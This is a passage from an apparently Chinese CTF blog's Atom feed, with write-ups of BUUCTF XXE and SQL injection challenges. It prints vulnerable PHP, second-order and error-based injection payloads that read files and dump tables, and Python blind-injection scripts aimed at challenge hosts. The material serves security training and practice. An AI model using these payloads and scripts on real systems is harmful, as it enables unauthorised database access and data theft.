<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>be a J0K1R</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-06-02T15:14:12.188Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Peguin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xxeChallenge</title>
    <link href="http://yoursite.com/2020/06/02/xxeChallenge/"/>
    <id>http://yoursite.com/2020/06/02/xxeChallenge/</id>
    <published>2020-06-02T14:59:41.000Z</published>
    <updated>2020-06-02T15:14:12.188Z</updated>
    
    <content type="html"><![CDATA[<p>前述：xxe国内题目较少，总结在一起，方便回顾<a id="more"></a></p><h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h3><p>开题是个登录框，题目说了是xml的题，直接想到xxe，不用尝试sql注入了</p><p>用burp抓包登录，可以看到抓到的数据就是xxe的格式，尝试外部实体注入读取/etc/passwd，成功,没啥东西，来看看/etc/hosts,发现存活主机</p><img src="/2020/06/02/xxeChallenge/1.png" class="" title="examplename"><p>那就直接http访问主机，结果如下</p><img src="/2020/06/02/xxeChallenge/2.png" class="" title="examplename"><p>报错了，那就是没有这台主机，其他师傅说这是要打内网的主机，需要跑脚本，但是这题好像后一个地址就是了，那就试试</p><img src="/2020/06/02/xxeChallenge/3.png" class="" title="examplename"><p>可以看到读到了flag，这里内网主机可以用burp爆破，脚本暂时没找到</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前述：xxe国内题目较少，总结在一起，方便回顾
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>SQLChallenge</title>
    <link href="http://yoursite.com/2020/05/30/SQLChallenge/"/>
    <id>http://yoursite.com/2020/05/30/SQLChallenge/</id>
    <published>2020-05-30T06:55:05.000Z</published>
    <updated>2020-06-04T14:56:14.378Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入题型很多，方法还是那一些，就把SQL注入题放一起，方便复习回顾<a id="more"></a></p><h3 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h3><p>打开页面是一个订单提交的页面，看一下网页源码找到了提示，应该是用filter://来读取源码</p><p>依次读取config.php,delete.php,change.php,confirm.php,base64解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#confirm.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = $_POST[<span class="string">"address"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $msg = $user_name.<span class="string">"å·²æäº¤è®¢å"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span>;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(<span class="string">"sss"</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#search.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#change.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">"address"</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里可以看到user_name和phone都经过了严格的过滤，只有address可能可以注入</p><p>这里注意到address经过addslashes函数转义不会造成注入，但是会跟着user_name和phone存入数据库，在存入mysql数据库的时候转义的字符会被去掉，也就是说数据又恢复到输入的时候，这就可以利用二次注入了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">update</span> <span class="string">`user`</span> <span class="keyword">set</span> <span class="string">`address`</span>=<span class="string">'".$address."'</span>, <span class="string">`old_address`</span>=<span class="string">'".$row['</span>address<span class="string">']."'</span> <span class="keyword">where</span> <span class="string">`user_id`</span>=<span class="string">".$row['user_id'];</span></span><br></pre></td></tr></table></figure><p>更改地址信息时会报sql语句的错，这里就可以用报错注入的方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1' where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="string">'/flag.txt'</span>),<span class="number">1</span>,<span class="number">30</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('</span>/flag.txt<span class="string">'),31,60)),0x7e),1)#</span></span><br></pre></td></tr></table></figure><p>首先在页面创建地址为上述语句的订单，在修改地址页面再次输入就可报错回显部分flag，前后两次flag拼接即可</p><h3 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h3><img src="/2020/05/30/SQLChallenge/1.png" class="" title="examplename"><p>用burp抓包看到一个client-ip,猜测可以用X-Forwarded-For,果然，数据会先写到数据库中，第二次写入时会拿出上次写入的内容，可以用盲注进行注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author peguin</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://node3.buuoj.cn:27656/"</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"track_uuid=5d7911a1-6ee7-4468-a15e-4ca7b34ad643"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0"</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'X-Forwarded-For'</span>:<span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;high:</span><br><span class="line">        <span class="comment"># payload = "0' or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125; or '0".format(i,mid)//information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e</span></span><br><span class="line">        <span class="comment"># payload = "0' or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='F4l9_D4t4B45e')),&#123;&#125;,1))&gt;&#123;&#125; or '0".format(i,mid)//F4l9_t4b1e</span></span><br><span class="line">        <span class="comment"># payload = "0' or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F4l9_t4b1e')),&#123;&#125;,1))&gt;&#123;&#125; or '0".format(i, mid)//F4l9_C01uMn</span></span><br><span class="line">        payload = <span class="string">"0' or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),&#123;&#125;,1))&gt;&#123;&#125; or '0"</span>.format(i, mid)</span><br><span class="line">        head[<span class="string">'X-Forwarded-For'</span>] = payload</span><br><span class="line">        r = requests.post(url=url, headers=head)</span><br><span class="line">        head[<span class="string">'X-Forwarded-For'</span>] = <span class="string">"penson"</span></span><br><span class="line">        r = requests.post(url=url, headers=head)</span><br><span class="line">        r = requests.post(url=url, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Last Ip: 1 "</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += chr(mid)</span><br><span class="line">    print(res)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>这里要注意必须传入cookie，F12可以找到cookie</p><h3 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h3><p>开题，有一个注册和登录，题目提示SQL，那么试试or、and之类的注册，发现被过滤了，fuzz一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@</span><br><span class="line">or</span><br><span class="line">and</span><br><span class="line">space（空格）</span><br><span class="line">substr</span><br><span class="line">mid</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">handle</span><br><span class="line">.........</span><br></pre></td></tr></table></figure><p>注册用户名为admin”的用户，登录发现有修改密码，根据前面题目的经验应该又是一道二次注入题，来试试</p><img src="/2020/05/30/SQLChallenge/2.png" class="" title="examplename"><p>发现在修改密码是会报错，那么可以用报错注入的方式来做</p><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>()))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">'~article,flag,users'</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'flag'</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">'~flag'</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(flag))<span class="keyword">from</span>(flag))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">'~RCTF&#123;Good job! But flag not her'</span></span><br></pre></td></tr></table></figure><p>看来这个flag是假的，那么得在别的表里找找，发现在users</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'users'</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">'~name,pwd,email,real_flag_1s_her'</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(real_flag_1s_her))<span class="keyword">from</span>(<span class="keyword">users</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//<span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">'real_flag_1s_her'</span> <span class="keyword">in</span> <span class="string">'field list'</span></span><br></pre></td></tr></table></figure><p>可以看到应该是列没有完全输出，用regexp匹配吧</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x3a,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'users'</span>)&amp;&amp;(column_name)regexp(<span class="string">'^r'</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">':real_flag_1s_here'</span></span><br></pre></td></tr></table></figure><p>最后面读取flag有个坑，就是长度有限制，用reverse倒序输出即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x3a,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(real_flag_1s_here))<span class="keyword">from</span>(<span class="keyword">users</span>)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">'^f'</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"><span class="keyword">admin</span><span class="string">"^updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1)#</span></span><br></pre></td></tr></table></figure><h3 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h3><p>知识点：information_schema库被禁止访问后，可以用<strong>sys.schema_auto_increment_columns</strong>、<strong>schema_table_statistics_with_buffer</strong>、<strong>x$schema_table_statistics_with_buffer</strong></p><p>fuzz：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤and or等关键字</span><br><span class="line">不能用information_schema，过滤了sys.schema_auto_increment_columns </span><br><span class="line">没有单独过滤union和select, 但是过滤了union select</span><br><span class="line">过滤join</span><br></pre></td></tr></table></figure><p>经过测试查询正常时会返回NU1L</p><p>上盲注脚本（这个是Ying师傅的脚本<a href="https://www.gem-love.com/ctf/1669.html）后面的字符ASCII偏移一位原理讲解就在这里面：" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1669.html）后面的字符ASCII偏移一位原理讲解就在这里面：</a></p><p>自己写的二分法跑不出来，不知道为什么233333，就用Ying师傅的吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">alphabet = [<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'_'</span>,<span class="string">','</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'j'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'g'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'G'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'Z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">url = <span class="string">'http://8b008f3e-4320-4795-870b-4f489a316096.node3.buuoj.cn/index.php'</span></span><br><span class="line">target = <span class="string">'select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line">        payload = <span class="string">'2||ascii(substr((&#123;&#125;),&#123;&#125;,1))=\'&#123;&#125;\''</span>.format(target, i, ord(char))</span><br><span class="line">        data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:payload</span><br><span class="line">                &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="comment"># print(text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += char</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#users23333333333333,f1ag_1s_h3r3_hhhhh</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://8b008f3e-4320-4795-870b-4f489a316096.node3.buuoj.cn/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span><span class="params">(flag)</span>:</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res += hex(ord(i))</span><br><span class="line">    res = <span class="string">'0x'</span> + res.replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    hexchar = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">        hexchar = trans(flag+ chr(char))</span><br><span class="line">        payload = <span class="string">'2||((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))'</span>.format(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:payload</span><br><span class="line">                &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chr(char<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">核心payload：(<span class="keyword">select</span> <span class="string">'admin'</span>,<span class="string">'admin'</span>)&gt;(<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>)</span><br><span class="line">MySQL遇到<span class="keyword">hex</span>会自动转成字符串</span><br></pre></td></tr></table></figure><h3 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h3><p>登录注册，注册是有一个用户名，但是登录却没有用到，登录成功之后显示了用户名，也就是说注册的时候写入了数据库，之后再次拿出显示出来，应该存在二次注入。注册成功会302状态码跳转，失败返回200状态码</p><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0'%2B(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">hex</span>(<span class="keyword">hex</span>((<span class="keyword">select</span> * <span class="keyword">from</span> flag))) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">10</span>))%<span class="number">2</span>B<span class="string">'0</span></span><br></pre></td></tr></table></figure><p>为什么payload是这样的，看一下本地测试</p><img src="/2020/05/30/SQLChallenge/3.png" class="" title="examplename"><p>只经过hex一次的数据会显示不全，加上0是为了完全显示，之后，发现加0的查找会只显示字母之前的数字，后面的全部被截断了，所以用两次hex，这里有数据精度的问题，科学计数法数据显示不全，这就要用到substr来几位几位查找，下面的是一个其他师傅的脚本，可以直接用，有时间了再自己写写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 